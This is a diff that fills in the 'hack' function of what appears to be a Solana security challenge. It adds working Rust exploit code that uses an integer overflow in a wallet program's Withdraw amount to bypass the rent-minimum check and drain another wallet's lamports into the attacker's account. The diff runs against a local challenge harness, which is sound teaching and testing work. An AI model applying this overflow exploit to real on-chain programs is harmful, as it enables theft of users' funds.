@@ -8,7 +8,7 @@ use poc_framework::{
 use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
-use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program, sysvar};
 
 struct Challenge {
     hacker: Keypair,
@@ -18,7 +18,114 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+    use borsh::BorshSerialize;
+    use level2::{get_wallet_address, WalletInstruction};
+    use solana_program::instruction::{AccountMeta, Instruction};
+    use solana_program::rent::Rent;
+
+    // init hacker wallet to be used, so that owner becomes program
+    _env.execute_as_transaction(
+        &[level2::initialize(
+            _challenge.wallet_program,
+            _challenge.hacker.pubkey(),
+        )],
+        &[&_challenge.hacker],
+    )
+    .print();
+
+    let hacker_wallet = get_wallet_address(_challenge.hacker.pubkey(), _challenge.wallet_program);
+    println!("[+] hacker_wallet address: {}", hacker_wallet);
+
+    let hacker_balance = _env
+        .get_account(_challenge.hacker.pubkey())
+        .unwrap()
+        .lamports;
+    let hacker_wallet_balance = _env.get_account(hacker_wallet).unwrap().lamports;
+    println!("[+] hacker balance: {}", lamports_to_sol(hacker_balance));
+    println!(
+        "[+] hacker wallet balance: {}",
+        lamports_to_sol(hacker_wallet_balance)
+    );
+
+    let minbal = Rent::default().minimum_balance(32);
+    println!("[+] rent minimum balance: {}", lamports_to_sol(minbal));
+
+    println!("[+] rent minimum balance i64: {}", minbal as i64);
+
+    let overflow = (-(minbal as i64)) as u64;
+    println!("[+] overflow: {}", overflow);
+
+    // this actually triggers overflow and panick here
+    // let overflowed: u64 = minbal + overflow;
+    // println!("overflowed: {}", overflowed);
+
+    // send multiple transactions with overflow to bypass rent min balance check
+    for i in 0..10 {
+        _env.execute_as_transaction(
+            &[Instruction {
+                program_id: _challenge.wallet_program,
+                accounts: vec![
+                    AccountMeta::new(hacker_wallet, false), // source wallet
+                    AccountMeta::new(_challenge.hacker.pubkey(), true), // owner
+                    AccountMeta::new(_challenge.wallet_address, false), // target wallet
+                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+                    AccountMeta::new_readonly(system_program::id(), false),
+                ],
+                data: WalletInstruction::Withdraw {
+                    amount: overflow + i, // adding index as nonce to avoid double spending
+                }
+                .try_to_vec()
+                .unwrap(),
+            }],
+            &[&_challenge.hacker],
+        )
+        .print();
+    }
+
+    let hacker_balance = _env
+        .get_account(_challenge.hacker.pubkey())
+        .unwrap()
+        .lamports;
+    let hacker_wallet_balance = _env.get_account(hacker_wallet).unwrap().lamports;
+    println!("[+] hacker balance: {}", lamports_to_sol(hacker_balance));
+    println!(
+        "[+] hacker wallet balance: {}",
+        lamports_to_sol(hacker_wallet_balance)
+    );
+
+    // send transaction to withdraw
+    _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(hacker_wallet, false), // source wallet
+                AccountMeta::new(_challenge.hacker.pubkey(), true), // owner
+                AccountMeta::new(_challenge.hacker.pubkey(), false), // target
+                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw {
+                amount: minbal * 10 - 500,
+            }
+            .try_to_vec()
+            .unwrap(),
+        }],
+        &[&_challenge.hacker],
+    )
+    .print();
+
+    let hacker_balance = _env
+        .get_account(_challenge.hacker.pubkey())
+        .unwrap()
+        .lamports;
+    let hacker_wallet_balance = _env.get_account(hacker_wallet).unwrap().lamports;
+    println!("[+] hacker balance: {}", lamports_to_sol(hacker_balance));
+    println!(
+        "[+] hacker wallet balance: {}",
+        lamports_to_sol(hacker_wallet_balance)
+    );
+}
 
 /*
 SETUP CODE BELOW
